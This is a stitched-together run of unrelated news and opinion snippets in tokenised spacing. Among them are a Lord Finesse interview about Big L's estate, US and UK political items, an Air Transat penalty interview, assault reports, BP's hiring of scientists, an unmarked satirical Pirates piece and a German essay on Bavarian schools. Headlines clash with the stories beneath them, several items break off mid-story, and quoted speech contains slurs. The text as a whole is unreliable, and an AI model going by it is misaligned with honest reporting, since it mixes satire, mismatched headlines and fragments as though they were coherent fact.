Lord Finesse : [ He ] ca n’t sue nothing ; you ca n’t look for something you do n’t know about .
It ai n’t even like he knows about Big L ’s career .
He do n’t even know none of Big L ’s songs !
How is he going around suing anything ?
What are you suing for ; what are you looking for ?!
DX : And , let me just ask , why ca n’t I put this on the record ?
I ’d really , really , really like to put this on the record .
I mean , why do n’t you want this on the record ?
Lord Finesse : Nah , ‘ cause it ’s really nobody ’s business .
It ’s just – I stated it a couple of times publicly [ last year ] .
But , that ’s just it , man .
I ’m really tired of talking about [ what could have been ] , because it was a lineup where me and [ DJ ]
Premier was gonna do it together .
It was systematically put in place , everything .
We was gonna go back to The Big Picture album , we was gonna remix some of those songs – the way that album shoulda sounded .
‘ Cause we felt like The Big Picture album was all over the place – on certain collaborations , the sound , everything .
So , between a mixture of unreleased songs , [ and ] some remixes , we was gonna really do this over – with Premier reaching out to Jay - Z , and I think [ Big Daddy ]
Kane was on call , and I pulled a favor with Shady [ Records ] about Eminem .
It was on tap to go down .
It was on tap to go down like bigger than ever before .
But , who ’s gonna do all this work for the proceeds to go to this nigga ?
That just really do n’t make no sense .
If anybody can ever explain to me how …it can be done without this nigga getting anything , [ then ] it ’ll happen .
DX : Let me just ask you again – I never do this …if someone tells me it ’s off the record , it ’s off the record , [ but ]
I ’m just gonna start begging , please , please let me put this on the record .
I mean , ‘ cause I do n’t think as many people know about this as you think they do .
Lord Finesse : Yeah … I mean , you can put it on the record .
I mean , I ’ve said it before …
It ’s [ just ] a shame that we ca n’t do [ that album ] , but I ’m not gonna be financially responsible for this nigga getting paid , man , I ’m just not .
I spoke to him , because Big L’s moms said the dude wanted to speak to me , and [ so ] we talked .
And at the time he was paid off , as far as The Big Picture …
He got paid off not to get anything from Big L’s future royalties , period .
But once [ Big L’s mother ] passed , it ’s like that contract is dead now .
[ Since then he ’s been like ] , “ Yo , where these songs at ?
I wanna do a project .
I love my son . ”
And it ’s hard to swallow that .
It ’s hard to hear somebody that abandoned they – How the fuck do you abandon your son ?
“ I ’m so proud of my son . ”
Just to hear that statement made me wanna choke the shit out of him .
Because if you was so proud why did you leave him ?
That ’s never gonna really rub well with me .
And it ’s a shame , because I represent L to the day of my death , man .
Until I ca n’t do Hip
Hop no more I will represent this dude to the fullest , but not if it means getting somebody else rich .
Not if it means putting money in somebody else ’s pocket .
And it hurts , because you got fans out here that look at L as their hero , their unsung hero … and we can’t really give him the necessary project he deserves .
Stay tuned to HipHopDX for “ The Making of Big L’s Lifestylez Ov Da Poor & Dangerous ” feature , which will include never - before - published information and insight about L’s classic debut .
For instance , did you know L’s debut was originally to be titled Murder Inc . ?

Federal Aviation Administration Exploring Possibilities of Unmanned Commercial Flight
Passenger drones may take wing soon
WASHINGTON — Spooked by concern about deficits , the Senate shelved a spending bill that included an extension of unemployment benefits , suddenly cutting off a federal cash spigot opened by President Barack Obama when he took office 18 months ago .
The collapse of the wide - ranging legislation means that a total of 1.3 million unemployed Americans will have lost their assistance by the end of this week .
It will also leave a number of states with large budget holes they had expected to fill with federal cash to help with Medicaid ...
Image caption Muslims have had their own court system since colonial rule
Kenya's Islamic courts are illegal and discriminatory , a panel of judges has ruled .
The three judges said the Islamic " Kadhi " courts favoured Islam over other faiths , and that this was unconstitutional as Kenya was a secular country .
The issue of Islamic courts has been a contentious point in the country 's new proposed constitution .
It is due to go to a referendum in August .
The Kadhi courts - set up under British colonial rule - mainly deal with matters of marriage and inheritance for Kenya 's Muslim minority .
The Christian church in Kenya brought the case to court six years ago .
As part of a power - sharing deal to end deadly riots following elections in December 2007 , it was agreed that a new constitution would be written .
There have been worrying signs since the formation of the Coalition government that its support for civil liberties might not be strong as advertised .
It was , above all , a shared commitment to rolling back the intrusive powers given to the state by New Labour which provided the glue that brought the Tories and the Lib Dems together with the Coalition Agreement proudly announcing plans to “ restore the rights of individuals in the face of encroaching state power , in keeping with Britain ’s tradition of freedom and fairness . ”
With increasing numbers of Lib Dems uneasy , as it becomes obvious how much has been surrendered to the Tories on economic and financial policy , the civil liberties agenda will have to bear much of the weight of long - term co-operation between the two parties .
But barely two months into the new government , a number of decisions raise serious cause for concern .
The first indication of backtracking was the government ’s decision to push ahead with the construction of the Summary Care Record , a central medical database that will store records of all major illnesses , allergies and prescriptions and make the data available to NHS personnel across England and Wales .
This database , which assumes consent unless you explicitly opt out of it , raises serious privacy concerns whilst its cost and effectiveness have been repeatedly questioned by medical professionals .
The Conservatives promised last year that they would " dismantle " central NHS IT infrastructure and then Lib Dem health spokesperson Norman Lamb labelled the scheme “ a disastrous waste of money ” that should be abandoned .
These firm commitments have now been downgraded into a review of the scheme – something quite extraordinary when you consider the state of the public finances and the Coalition 's professed commitment to our privacy .
It seems reasonable to suspect a determined alliance between Whitehall functionaries committed to control from the centre and corporate interests determined to keep the government hooked on large - scale projects .
Having shown its flexibility on the “ database state ” , the new government performed a similar act on the question of detention without charge .
Theresa
May , the home secretary , announced she would seek to renew for six months the measure that allows terror suspects to be held for 28 days without charge .
Although May promised that this was only a " temporary measure " , and that the government would be " be looking to reduce it over time " it hardly bodes well .
May will come under massive pressure from the security services and people within her own department over the next six months to keep the period of pre-charge detention at 28 days .
The new government should have taken the opportunity to renounce one of the most draconian and controversial legacies of the “ war on terror ” and underline its commitment to due process .
Experience suggests if these decisions are not taken early , ministers become captured by the interests of the status quo .
David Davis , the former home secretary who resigned when the Commons approved 42 days , pointed out that the six - month extension is “ unnecessary and regrettable ” given there have been
no cases in the last four years where it has been necessary to go beyond 21 days .
Even [ with ] the Heathrow plot – where innocent people were held for 28 days – it has now been proven that those that were charged after this period could have been charged in less than 14 days .
There are further worrying signs in the government 's attitude to the raft of knee - jerk authoritarian measures brought in over recent years to deal with so - called “ anti- social ” behaviour .
The government this week refused to heed the Council of Europe ’s call for a ban on “ Mosquitoes ” , the devices used by councils to disperse young people with a high frequency noise not audible to adults .
Nick Herbert said that the government “ do not see this as an issue on which we should intervene " despite the Council of Europe ’s clear warning that they contravene human rights .
Alongside ASBOS - which the government also shows no signs of repealing – these sinister instruments have come to symbolise the criminalisation and collective punishment of young people by a state that pays scant regard to their rights .
A government which thinks it appropriate to deploy devices originally devised for use against rats , mice and cockroaches against children can be called many things , but not , I ’m afraid , a liberal one .
Alongside these decisions , it is becoming clear that in some areas , such as the regulation of CCTV , Tory ministers are coming under pressure from their backbenchers to dilute the commitments in the Coalition Agreement .
The Lib Dems , who have already swallowed so much , should not accept this for one moment .
The Coalition parties came together in a supposedly “ liberal moment ” united by a project to undo Labour ’s authoritarian expansion of the state and its powers .
When the Coaltion announced its freedom agenda , Anthony Barnett immediately welcomed its committment to " protect " our liberty even while it sought to " rein it in " .
He also thought that its plans for democratic reform were " likely to prove the most significant fault - line in the Coalition " rather than its budget .
But now , just two months in , some of the decisions the Coalition is taking suggest it is not , after all , protecting our liberties .
This is very disturbing indeed .
RAJKOT , India , June 23 ( UPI ) -- A 4 - year - old Indian boy set a national record by completing 1,500 pushups in 40 minutes .
Ruchi Vitha of Rajkot said her son , Ronak Vitha , enjoyed performing pushups from a very young age , Asian News International reported Wednesday .

" When he was two years old , we used to practice yoga at home , stretching exercises and he used to perform yoga on his own , something that was very difficult for us to do .
That 's when we realized that his body is flexible , " Vitha said .
" Then we made him do one or two pushups and the next day he did ten on his own , " she said .
Vitha said she and her husband hired trainer Satyajit Chaurasia , who helped actor Aamir Khan prepare for his role in the film " Ghajini , " to help prepare their son for the record attempt .
" I want to become a tennis player and also have a body like Aamir Khan's in the film Ghajini , " Ronak Vitha said .
It 's difficult for a political party to think strategically after a political defeat as severe as 2008's .
But the Tea Party elevated the inability to think strategically into a fundamental conservative principle .
Its militants denounce those Republicans who have resisted the movement as ideological traitors : " Republicans in name only " or even ( charmingly ) as " Vichy Republicans " .
In fact , the unthinking rejectionism of the Tea Party has strengthened Obama 's political position .
Now it threatens to deplete Republican strength in Congress , losing races that could have been won .
Ronald Bell , 28 , victim of a police beating caught on film .
James Mandarino , the suburban police officer who was caught on tape delivering a savage beating to a suspect , was charged Thursday with official misconduct and aggravated battery .
Mandarino had followed the man , 28 - year - old Ronald Bell , for around 30 seconds early on March 28th , according to the Chicago Sun -Times .
Bell 's tires were squealing , and as he pulled into the driveway of his Streamwood home , Mandarino emerged from his squad car with his weapon drawn .
Footage taken from the squad car 's camera shows Mandarino using a Taser on the car 's passenger , and then hitting Bell on the head , back and arms with a baton .
( Scroll down to watch the disturbing footage . )
The prosecutor , Assistant Cook County State 's Attorney Alexander Vroustouris , told the Chicago Tribune that the victim appears to have done nothing to provoke the officer 's attack .
" At no time during the time period when the defendant is beating the victim with his baton does the video reflect that the victim had anything in his hands , nor does the video reflect the victim making any threatening motions toward the defendant , '' Vroustouris said .
" The victim is completely compliant . "
Meanwhile , his boss was n't mincing words about the offense .
Also from the Trib story :
" Every law enforcement officer holds his or her powers through the public trust and this defendant 's senseless act of rage against an unarmed citizen constitutes an offensive violation of that trust , " Cook County State 's Attorney Anita Alvarez said after the court hearing .
" This conduct cannot and will not be tolerated . "
The Daily Herald reports that the officer originally charged Bell with a DUI , but that those charges were dropped .
Instead , it is Mandarino who faces charges .
And , State 's Attorney Alvarez said to the Sun - Times , more charges are still to come .
Watch Mandarino attacking Bell :
Here is this reporter ’s extensive video interview with Air Passenger Rights Advocate Dr. Gabor Lukacs re Air Transat Tarmac Delay $ 295,000 Penalty ( legal notice of violation ) ( press release ) .
An extensive timecoded - links ( allowing user to directly jump into the video ) with extensive notes and transcripts of the interview has been included below for your ease of references .
[ Note : the video itself should be the authority of what were said as accidental transcription errors are quite possible . ]
0:18 Reporter ( KL ) asks Dr. Lukacs ( GL ) to explain the CTA ’s ( Canadian Transportation Agency ) Air Transat Tarmac Delay $ 295,000 Penalty .
How the $ 295,000 was likely decided ?
Is it a good decision for Canadian Air Passengers ?
1:24 Dr. Lukacs ( GL ) sees the $ 295,000 penalty as a “ publicity stunt by the CTA to support the government ’s effort to pass Bill C - 49 [ commonly known as passenger bill of rights ( CBC news article ) ( read the text of bill ( searchable via Parliament ) , PDF image via CBC ) ] . ”
1:35 KL : Why would you say this is a “ publicity stunt ” ?
1:38 GL : The CTA “ pretends it has teeth , pretends it issues a big fine while in reality , the fine has been waived . ”
1:46 KL : How come ?
On paper and the press release , Air Transat has been fined $ 295,000 .
Even around the world , BBC news has been reporting the same $ 295,000 fine .
2:13 GL : “ According to the media release , Air Transat will not have to pay money that it pays passengers .
In other words , it can take the amount of the fine and pay that to passengers .
However , it comes out to $ 500 per passenger and Air Transat has already pay to many passengers $ 400 as I checked back in August [ 2017 ] . ”
2:40 KL : I see in the previous CTV report you sent me .
Air Transat already paid $ 400 to some passengers .
Now $ 500 is like nothing [ not much more ] ?
3:00 GL : Two problems .
1 ) Under the law , CTA cannot waive or reduce the amount of penalty that has been set out in notice of violation .
Once the notice of violation has been …
3:46 GL ( 2 ) The notice of violation has been botched .
It identifies two violations and each violations can only carry a maximum fine of $ 10,000 .
4:00 KL : Notice cites only two violations and it cites specific sections of the law ( which the reporter admits he is n’t clear about them and their legal limitations ) but from GL ’s reading , each violations can ONLY be fined up to $ 10,000 ?
4:28 GL : “ If they treat a WHOLE AIRPLANE LOAD OF PASSENGERS being locked without water and food and air as a SINGLE violation as it transpires from the notice of violation , then each of those violations can only carry $ 10,000 penalty .
What I think is breach of each passenger ’s right is a separate violation and therefore for each passenger [ of the 590 passengers in total ] the agency can issue $ 10,000 for a total of $ 5.9 million which makes us see how little penalty has been issued if you look at things properly . ”
5:25 GL : Two simple questions for the CTA : Q1 )
How the fine was determined ?
Based on what calculations ?
Q2 )
What gives the agency any authority to waive the fine that has been issued under the notice of violations ?
GL is not aware of any such power in the Canada Transportation Act .
6:00 GL : Whatever penalty they [ CTA ] put in the notice of violation , they cannot after the fact … waive part of [ the fine ]
6:13 KL : You are saying CTA has no power to say , within the $ 295,000 fine , if Air Transat has or will pay any amounts to passengers , those amounts can be deducted from the fine .
( It should be NOTED that in this CTV August 4 , 2017 news “ Air Transat offering $ 400 to passengers stranded in Ottawa “ , Air Transat has already “ offered monetary compensation ( $ 400 ) as a gesture of good faith ” long before the hearings and the new “ penalty ” . )
6:41 GL : Further discussions about the fine calculations and maximum penalties .
7:11 GL : If CTA counts each passenger as a separation violation , then it is only $ 500 per violation , then by CTA ’s own guideline , it would be exceptionally low !
If treated as 590 separate violations , then it would be unreasonable in each case to fine the airline only for $ 500 .
7:38 GL : Personally GL thinks each passenger should be treated as a separate violation but if one looks at the notice of violation , it is NOT how the notice reads .
7:50 KL : Ask about precedent setting power of such a big and high profile case .
8:13 GL : Discuss the numerical side of the fine calculation … vs the actual “ Notice of Violation ” ( the legal foundation of the fine as the reporter understands from GL ’s explanation ) which states TWO violations . [… ]
Either way you look at it , the penalty does n’t make sense !
TWO violations : Max $ 20,000 .
If seen as 590 separate violations , then the fine should be close to a few million dollars !
9:08 KL : Some passengers were unhappy of the CTA ’s penalty .
The reporter imagines himself in the shoes of the trapped and locked up passengers ( for over 5 hours ) and he would be unhappy with a $ 500 “ penalty ” or compensation !
9:37 GL : Very troublesome .
9:43 KL : What do you expect to see happen ?
Air Transat has no problem agreeing with CTA ’s determination and paying the penalty .
Are there any recourse for passengers that got stuck on those planes ?
10:49 KL : How will a challenge benefit those affected passengers ?
Will the passengers be able to get more [ monetary compensation ] ?
Individually negotiate a higher amount …
11:07 GL : The message has to be clear that “ the penalty is issued and waived at the same time ” !
‘ We issue the penalty but also waived it is what happened !
“ Thats what I would like to put a stop to . ” [… ]
“ The agency cannot play fast and loose to show some good statistics that we issued a big amount of penalty but at the same time say we are not collecting it , we are waiving the amount .
Thats dishonest .
Thats a form of intellectual dishonesty .
Something that borders on fraud to the public because the public hear , ‘ Oh , there is a big fine issued . ’ but actually the fine is not being collected .
So if you are ti fine a person , the fine has to be collected . ”
11:59 KL : Just to clarify .
Is GL using waive because money paid or to be paid to passengers , etc can all be deducted from the $ 295,000 fine ?
Sooner or later , with whole bunch of deductions , Air Transat may not pay anything or very little as fine to CTA ?
12:39 GL : “ Yes .
And there is an important issue of the Rule of Law here !
That if the law says the agency can NOT waive penalty , then the agency cannot waive penalty .
There is nothing in the law that permits doing this .
So it is difficult to understand how this came to be .
And what type of arrangement , what type of communication took place between CTA and Air Transat that lead to this outcome .
What negotiation took place ?
It is troubling .
I ’m concern that something inappropriate happened in the background . ” [… ]
13:41 KL : Obviously , you have no evidence that Air Transat and CTA had made any backroom deal or anything ?
13:49 GL : The timing looks suspicious that they waive the penalty and Air Transat is going to comply .
The way that the amount seems to be very close to what they already paid .
It looks suspicious .
We do n’t know for sure but one thing I like to make sure that this type of backroom deal is not possible because the law does n’t permit that .
So even if they want to make this kind of backroom deal , the law is there to ensure that if a fine is issued then a fine has to be collected . ”
14:22 KL : You want to appeal because of the precedent setting power of cases like this ?
14:32 GL : “ It is MORE than precedent setting power .
It concerns the Rule of Law .
The Parliament decides to grand the agency certain power , the agency cannot overstep those boundaries .
If they issue a notice of violation , the have to stay within the confine of the law .
The law says they can issue notice of violation .
Nothing in the law that would allow them to rescind a notice of violation on the basis of some amount that has been paid .
Thats not the power the enforcement officer has .
The notice of violation has been issued at that point .
They become functus officio .
They ’ve done their jobs . ”
15:13 KL : Would you worry about unintended consequence that if you challenge the decision , and then the court agree with you that the fine can be $ 20,000 maximum which amounts to next to nothing ?
15:31 GL : “ It would show how inadequate the legislation is for sure .
And it will also uphold the rule of law .
The Rule of Law as a principle is more important than any kind of Air Passenger Rights .
It is a far bigger , it is the corner stone of democracy .
If we abandon the Rule of Law as a principle for some financial benefit , then we loose the backbone of our society ! ”
15:56 KL : Thats an interesting claim .
Will see what GL decides in the coming days .
Thanks a lot Dr. Lukacs for explaining the decision to me and the viewers .
This , to me , is an important and precedent setting and obviously you mentioned Rule of Law is at stake here .
16:21 GL : Thank you very much .
P.S. Traditional news media like CBC , CTV , Global , TorStar , BBC have done different reporting of this story ( some including background and some with passengers interview ) .
Worth a read and watch .
P.P.S. Since this reporter first wrote about the 2009 Supreme Court of Canada “ Grant v. Torstar Corp. , 2009 SCC 61 ” decision , this reporter has tried his best to keep the idea of “ Responsible Communication ” in mind in all his reporting .

Video after the Jump
A Vancouver couple who returned home on Saturday night were attacked by two men they found urinating against their townhouse .
The Province reports :
" Two thugs viciously assaulted David Holtzman and his partner , Peter Regier , as they tried to enter their townhouse on Keefer Street at around 10:45 p.m .
' We were out at a concert and came home and found two guys on our steps peeing against the wall , ' Holtzman told The Province .
' I said , ‘ Do you really have to pee there ? ’'
The man replied with extremely vulgar , anti-gay invective , he said .
Holtzman said he and Regier were attacked without provocation .
He received about 50 punches to his head and body and was twice bitten by his attacker .
He still had blurry vision in one eye Sunday , but an eye doctor has told him he likely will recover .
Both Holtzman and Regier suffered concussions , with Regier beaten so viciously he was taken to hospital , where surgical staples were put in his head to close a wound . "
Although there was a UFC fight going on in the area , police say there appears to be no connection between it and the couple 's attackers , thought they will continue to look into it .

The federal agency charged with protecting endangered species like the brown pelican and the Kemp ’s ridley sea turtle signed off on the Minerals Management Service ’s conclusion that deepwater drilling for oil in the Gulf of Mexico posed no significant risk to wildlife , despite evidence that a spill of even moderate size could be disastrous , according to federal documents .
By law , the minerals service , before selling oil leases in the gulf , must submit an evaluation of the potential biological impact on threatened species to the Fish and Wildlife Service , whose responsibilities include protecting endangered species on land .
Although the wildlife agency cannot block lease sales , it can ask for changes in the assessment if it believes it is inadequate , or it can insist on conducting its own survey of potential threats , something the agency has frequently done in the past .
But in a letter dated Sept. 14 , 2007 , and obtained by The New York Times , the wildlife agency agreed with the minerals service ’s characterization that the chances that deepwater drilling would result in a spill that would pollute critical habitat was “ low . ”
The agency signed off on the minerals service ’s biological evaluation , even though that assessment considered only the risks to wildlife based on spills of 1,000 to 15,000 barrels  a minuscule amount compared with the hundreds of thousands of barrels now spewing into the gulf .
The assessment also noted that even such modest spills carried up to a 27 percent risk of oil reaching the critical habitat for some endangered species .
Ten years after being locked out by their employer , union workers at Avery Heights Nursing Home began receiving checks totaling $ 2.55 million in a National Labor Relations Board ( NLRB ) settlement .
The case has important implications for workers everywhere .
The workers , members of New England Health Care Employees Union District 1199 , were locked out after going on strike in November 1999 .
The workers maintained picket lines for more than two years .
Eventually , the NLRB ruled the lockout violated the law because it was an excuse to break the union .
The nursing home was ordered to rehire the union members .
In a press release , the union quoted employment law scholar Michael Wishnie “ This decision has broad implications for national labor law .
For years , employers have used their power to hire permanent replacements as an excuse to try to destroy unions . ”
In those cases , Wishnie says , this decision means that the union workers have to get their jobs back , and the employer has to pay back pay and benefits .
The legal battle , which lasted most of the last decade , ended when the Supreme Court refused to hear the company ’s appeal last October .
Herman Davies , Jr. , who has worked in the Avery Heights housekeeping department since 1991 , is quoted as saying , “ We ’ve waited a long time for justice , ” Of course the money is important to us after all these years , but it ’s even more important to see right win out over might . ”
Sharon Weir , a nurses ’ aide , said , “ I am so , so proud .
We won .
Our fight was not in vain . ”

Image caption Bob Shipp said BP wanted to hire his entire marine science department
The head of the American Association of University Professors has accused BP of trying to " buy " the best scientists and academics to help it contest litigation after the Gulf of Mexico oil spill .
" This is really one huge corporation trying to buy faculty silence in a comprehensive way , " said Cary Nelson .
BP faces more than 300 lawsuits so far .
In a statement , BP says it has hired more than a dozen national and local scientists " with expertise in the resources of the Gulf of Mexico " .
The BBC has obtained a copy of a contract offered to scientists by BP .
It says that scientists cannot publish the research they do for BP or speak about the data for at least three years , or until the government gives the final approval to the company 's restoration plan for the whole of the Gulf .
It also states scientists may perform research for other agencies as long as it does not conflict with the work they are doing for BP .
And it adds that scientists must take instructions from lawyers offering the contracts and other in - house counsel at BP .
Bob Shipp , the head of marine sciences at the University of South Alabama , was one of the scientists approached by BP 's lawyers .
They did n't just want him , they wanted his whole department .
" They contacted me and said we would like to have your department interact to develop the best restoration plan possible after this oil spill , " he said .
Media playback is unsupported on your device Media caption Russ Lea from the University of South Alabama : Some clauses in the contract " were very disturbing " .
" We laid the ground rules - that any research we did , we would have to take total control of the data , transparency and the freedom to make those data available to other scientists and subject to peer review .
They left and we never heard back from them . "
What Mr Nelson is concerned about is BP 's control over scientific research .
" Our ability to evaluate the disaster and write public policy and make decisions about it as a country can be impacted by the silence of the research scientists who are looking at conditions , " he said .
" It 's hugely destructive .
I mean at some level , this is really BP versus the people of the United States . "
In its statement , BP says it " does not place restrictions on academics speaking about scientific data " .
' Powerful economic interests '
But New Orleans environmental lawyer Joel Waltzer looked over the contract and said BP 's statement did not match up .
Good scientists , they 're going to be giving their opinions based on the facts and they are not going to bias their opinions Professor Irv Mendelssohn , Louisiana State University
" They 're the ones who control the process .
They 're depriving the public of the data and the transparency that we all deserve . "
But some scientists who have been approached by lawyers acting on behalf of BP are willing to sign up .
Irv Mendelssohn is a professor in the Department of Oceanography and Coastal Sciences at Louisiana State University .
" What I 'm doing would n't be any different than if I was consulting with one of the natural resource trustees .
I am giving my objective opinion about recovery . "
Some scientists approached by BP lawyers have been offered as much as $ 250 an hour .
Prof Mendelssohn says he would negotiate his normal consulting fee , which is between $ 150 and $ 300 an hour .
But he says that is not why he is doing it .
" Good scientists , they 're going to be giving their opinions based on the facts and they are not going to bias their opinions .
What 's most important is credibility . "
But Cary Nelson is concerned about the relationship between corporations and academia .
" There is a problem for a faculty member who becomes closely associated with a corporation with such powerful financial interests .
" My advice would be : think twice before you sign a contract with a corporation that has such powerful economic interests at stake . "

" For a diehard Pirates fan who has been following this team for nearly 20 consecutive losing seasons , or really just anyone who watched them get beat 20 - 0 by the Brewers last week , this is certainly a well - deserved treat , " said 46 - year - old Jim Martin , walking through the turnstile to receive his souvenir program and his lethal dose of sodium thiopental .
" I have n't seen so many people so relaxed and generally happy to be at a Pirates game in a long time . "

Why are Minnesota 's strapped courts and law - enforcement agencies increasingly doing unpaid grunt work for the highly profitable debt - collection industry ?
A week ago , a shocking Star Tribune story by Chris Serres and Glenn Howatt revealed that a growing number of Minnesotans are being arrested , booked and even jailed after failing to make a court appearance over an old debt .
The number of debtor - related arrest warrants issued in the state has risen 60 percent over the past four years , according to the story , which revealed 845 cases in 2009 .
That 's a relatively small number , but it should alarm the thousands of families around the state facing medical bills or mounting debts after a job loss .
Anyone who 's ever battled a debt collector over a disputed charge or a case of stolen identity should also be unnerved .

Laut einer Umfrage der Landes - Eltern - Vereinigung erleben gut achtzig Prozent der Eltern das Gymnasium als überaus belastend .
Warum das aber so ist , darüber schweigen sich die Elternvertreter lieber aus
Über 80 Prozent der Eltern geben an , dass ihre Kinder , die ein bayerisches Gymnasium besuchen , nicht mehr ausreichend Zeit für außerschulische Aktivitäten haben .
Sie hätten nur noch Schule und Büffeln im Kopf und müssten daher auf Sport und Musik , auf ehrenamtliches Engagement bei der Freiwilligen Feuerwehr , im Sportverein an der eigenen Schule verzichten .
Im Schnitt käme manch ein Gymnasiast auf 48 Wochenstunden , wobei die langen Fahrwege , Hausaufgaben , die Vorbereitung auf den nächsten Tag und das Lernen für Schulaufgaben noch gar nicht mit eingerechnet seien .
Gleichzeitig habe die Menge des Nachhilfeunterrichts exorbitant zugenommen .
Bedürfe noch jedes achte Kind der Anfangsklassen zusätzliche Außenförderung , verdopple sich dieser Anteil in der nächsten Jahrgangsstufe , während in der neunten Klasse gar jeder Dritte externe Hilfe brauche , vor allem in Mathematik und / oder Latein .
Zu diesen bedenklichen Zahlen kommt eine Umfrage , die die Landes - Eltern - Vereinigung für Gymnasien in Bayern jüngst durchgeführt hat und an der sich ca. 35 000 Eltern von gut 120 Schulen beteiligt haben .
Lage verschärft sich
Repräsentativ ist das Ergebnis allerdings nicht , da sich etliche Schulen daran nicht beteiligt hatten .
Das Kultusministerium habe , obwohl es grünes
Licht dafür gegeben habe , vorab mit einem Schreiben an die Schulleitungen vor juristischen Problemen und ihrer Rechtmäßigkeit gewarnt , was etliche Elternbeiräte davor habe zurückschrecken lassen , sie an ihrer Schule durchzuführen .
Seit 2007 , wo man die nahezu identische Umfrage schon einmal abgehalten hatte , seien die neuerlichen Werte um ein Zehntel gestiegen , so Thomas Lillig , Geschäftsführer des LEVs , gegenüber Pressevertretern .
Für den weiteren Anstieg verantwortlich seien vor allem überfrachtete Lehrpläne , vermehrter Leistungsdruck , aber auch Unterrichtsformen , die dem Praktischen zu wenig Raum ließen und dadurch verhinderten , dass das Kind den Stoff verstehen und hinterher auch anwenden könne .
Entgegen aller Beteuerungen , die das Kultusministerium seit Jahre streue , sei die Stofffülle mit dem G8 keinesfalls kleiner geworden .
Im Gegenteil !
Wie es allerdings zu diesen dramatischen Werten komme , darüber schweigt sich der Lobbyistenverband lieber aus .
Und auch von Journalisten , die diese Ergebnisse in die Öffentlichkeit transportieren und dort verbreiten , kommt , obwohl es eigentlich deren Aufgabe wäre , solche Zahlen und Umfrageergebnisse genauer kritisch zu hinterfragen und zu werten , dazu herzlich wenig .
Wieder mal scheinen sie ihre Hausaufgaben nicht recht machen zu wollen - vielleicht auch , weil ihre Kinder selbst davon betroffen sein könnten .
Dabei läge die Wahrheit doch so offen auf der Straße , dass man sie im Prinzip nur aufzusammeln bräuchte .
Latent ungeeignet
Seit Jahren bewegen sich die Übertrittsquoten kontinuierlich nach oben .
Nicht nur in den Städten , sondern mittlerweile auch auf dem Land .
Inzwischen drängen über vierzig Prozent eines Jahrgangs aufs Gymnasium .
In manchen Landesteilen ist beansprucht bereits jeder zweite Grundschüler das Etikett " Hochschulreife " für sich .
Und bald wird das gewiss auch für einen gesamten Jahrgang gelten .
Da weder anzunehmen noch zu beobachten ist , dass die Kinder über all die Jahre um so viel klüger , lernwilliger und strebsamer geworden sind , textsicherer und kognitiv kompetenter als noch vor ein paar Jahren - man frage diesbezüglich mal bei einer gestandenen Lehrkraft in eine der davon betroffenen Schularten nach - , muss man davon ausgehen , dass noch mehr ungeeignete Schüler als früher aufs Gymnasium drängen und schließlich auch gehen .
Zudem hat man den Elternwillen gestärkt und die schulischen Anforderungen systematisch gesenkt .
Abzulesen ist das nicht nur an den Lerninhalten , die in den Kernfächern Deutsch und Mathematik den Grundschülern fortan abverlangt werden , sondern auch bei den Prüfungsarbeiten , die Schüler , deren Notenschnitt nicht für den Übertritt ausreicht , in einem gesonderten Probeunterricht bewältigen müssen .
Um dafür nur ein Beispiel zu geben : Neuerdings ist es möglich , dass ein Schüler , der beim landesweit durchgeführten Test in den Fächern Deutsch und Mathematik jeweils nur die Note Vier erzielt , allein aufgrund des Willens der Eltern aufs Gymnasium wechseln darf .
Eine Vorstellung , die für sich genommen schon zu Kopfschütteln Anlass gibt , wird damit doch der Eindruck vermittelt , dass ein Kind , das mit Vierern in den Kernfächern aufwartet , überhaupt für ein Gymnasium in Betracht kommt .
Grundschule
Talent , nicht Geld
Dass dann das Gymnasium für eine Vielzahl von Schülern und deren Eltern zum latenten Stress wird , sie sich ständig überfordert fühlen und der Nachhilfeunterricht zur lohnenden Einnahmequelle für andere wird ( Der Schwarzmarkt der Bildung ) , den sich viele Familien nicht immer leisten können , dürfte eigentlich niemand verwundern .
Gewiss darf Bildung , auch die höhere , nicht vom Geldbeutel abhängen .
Es geht hier allein um Können , Begabung und Talent , und nicht ums Bankkonto , den Ruf oder das Wohnviertel .
Schule hat keine Dienstleistungsfunktion , um finanziell begüterte Schichten zu gut dotierten Jobs durchzuwinken .
Auch und vor allem nicht für Mittelschichtseltern , die der Auffassung sind , einen Quasi-Rechtsanspruch auf " höhere Bildung " zu haben und bei einem Scheitern ihres Sprösslings gar meinen , dies der Schule oder einem ihrer Ansicht nach unfähigen Lehrer in die Schuhe schieben zu müssen .
Gleichwohl ist das Gymnasium eben auch keine Schule für alle .
Es stellt besondere , um nicht zu sagen , höchste Anforderungen an das Leistungsvermögen eines Schülers .
Dort sollen nicht viele , sondern möglichst die besten Schüler eines Jahrgangs unterrichtet und nachhaltig gefördert werden .
Zumal dort mehrere Sprachen beherrscht und politische Systeme verstanden werden müssen , naturwissenschaftliche Grundlagen vermittelt und Einblicke in die eigene wie in fremde Kulturen und deren Geschichte gegeben werden , wozu es allerdings dann auch differenzierterer Analyse , Deutung und kritischer Würdigung bedarf .
Zumindest war es so einmal gedacht .
Und das G8 , also die Verkürzung der gymnasialen Schulzeit um ein Jahr , war ursprünglich auch genau dafür neu eingerichtet worden .
In den allgemeinen Klagen und Lamentos über Leistungsdruck und Stofffülle , die die Elternvertreter seit der Gründung des G8 immer wieder anschlagen , wird das immer verschwiegen .
Sind Schüler nicht zum problemlösenden Denken fähig , zum Analysieren , Kombinieren und Transferieren ; und sind sie nicht in der Lage , Hausaufgaben , die den ausschließlichen Sinn haben , den in der Schule vermittelten Lernstoff nochmals zu vertiefen , allein zu bewältigen , dann sind sie am Gymnasium einfach fehl am Platz .
Mut zur Qualität
Es nützt dann auch wenig , sie jahrelang mitzuziehen , sie in übergroße Klasse einzupferchen , zusätzliche Lehrer für sie abzustellen , ihnen LRS , Legasthenie , Dyskalkulie oder andere " getürkte " Leistungsschwächen zu attestieren .
Schule , und hier vor allem das Gymnasium , wird für sie zu einem ständigen Hort der Demütigung , Kränkung und Erniedrigung .
Längst weiß man , dass knapp ein Drittel aller Gymnasiasten - auch hier ist die Tendenz steigend - dort nicht hingehören .
Auch an den Gymnasien gibt es etliche Schüler , deren Sprach - , Rechen - und Lesefertigkeiten so gering sind , dass die unterrichtenden Lehrer ihnen längst die rote Karte zeigen müssten .
Doch statt dies zu tun , sie erst gar nicht an diesen
Ort der Qual zu lassen , werden sie jahrelang mitgeschleppt , wo sie dann auch noch die Lernentwicklung der Begabtesten und Talentiertesten hemmen .
